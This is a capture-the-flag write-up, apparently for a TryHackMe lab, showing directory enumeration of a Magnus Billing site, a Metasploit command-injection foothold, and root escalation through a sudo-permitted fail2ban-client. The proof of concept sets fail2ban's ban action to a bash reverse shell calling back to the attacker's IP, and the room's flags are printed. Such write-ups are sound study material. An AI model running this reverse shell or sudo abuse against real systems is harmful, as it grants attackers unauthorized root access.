Target ip: 10.10.143.9
My ip:  10.2.3.159

A website is available on port 80:
```bash
> gobuster dir -w `fzf-wordlists` -u http://10.10.143.9:80/mbilling/ -t 50
/archive              (Status: 301) [Size: 321] [--> http://10.10.143.9/mbilling/archive/]
/resources            (Status: 301) [Size: 323] [--> http://10.10.143.9/mbilling/resources/]
/assets               (Status: 301) [Size: 320] [--> http://10.10.143.9/mbilling/assets/]
/lib                  (Status: 301) [Size: 317] [--> http://10.10.143.9/mbilling/lib/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.143.9/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 276]
```

Nmap Scan:
```bash
> nmap -sC -sV -p- -T4 10.10.143.9
```

The version used of Magnus Billing is vulnerable to command injection.

We get a shell with metsaploit and get the user flag:
`THM{4a6831d5f124b25eefb1e92e0f0da4ca}`

No let's try to escalate privilege.
```
meterpreter > shell

> sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

Let's abuse the fail2ban-client used to avoid bruteforce attacks.

```bash
PoC:

sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.2.3.159/9001 0>&1'"     
sudo /usr/bin/fail2ban-client set sshd banip 10.2.3.159

```

We put the action ban to be a reverse shell then we purposly ban our ip with a listener. And we get a root reverse shell !

Root flag: `THM{33ad5b530e71a172648f424ec23fae60}`